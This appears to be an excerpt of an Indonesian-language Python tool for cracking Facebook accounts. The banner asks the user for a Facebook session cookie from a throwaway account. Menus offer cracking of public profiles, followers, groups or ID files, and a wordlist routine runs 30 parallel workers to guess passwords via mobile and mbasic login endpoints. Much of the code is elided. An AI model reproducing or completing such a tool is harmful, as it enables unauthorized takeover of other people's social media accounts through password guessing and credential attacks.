...
def banner():
	...
	popen_xd(f'''\t
     ...
     {p}8888888         '°\/°           88888888
	                 ...
	                 {m}★{k}★{h}★BUCIN TURU{u}{h}★{k}★{m}★{u}\nSILAKAN MASUK KAN COOKIE AKUN FB MU\nSARANKAN GUNAKAN AKUN TUMBAL''')
...
def menu(my_name,my_id):
	...
	print(f'{sir}{b}PILIH PENGEN NGAPAIN LO')
	print(f'{m}[1] Crack Publik     {k}★     {k}[2] Crack Follower\n{k}[3] Crack Grup     {k}  ★     {h}[4] Crack File\n{h}[5] Hasil Crack     {k} ★     {m}[0] Keluar ')
...
def setting():
	...
	print(f'{b}MAU TIPE AKUN YANG MANA ?')
	print(f'{m}[1] Akun Old \n{k}[2] Akun New\n{h}[3] Random ') 
	print('')
	hu = input('➣Pilih : ')
	if hu in ['1','01']:
		...
		exit()
	print(f'{b}PILIH METODE LOGIN MU') 
	print(f'{m}[1] Mobile(Sangat Disarankan)     {k}★     {h}[2] Mbasic(Disarankan)\n{k}[3] Touch     {k}                   ★     {u}[4] Mtouch ')
	print('')
	hc = input('>> Pilih : ')
	if hc in ['1','01']:
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'SELAMAT MENUNGGU HASIL, SEMOGA BERUNTUNG')
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak(nel('\t[green] CRACK SELESAI........[purple] ★[yellow] '))
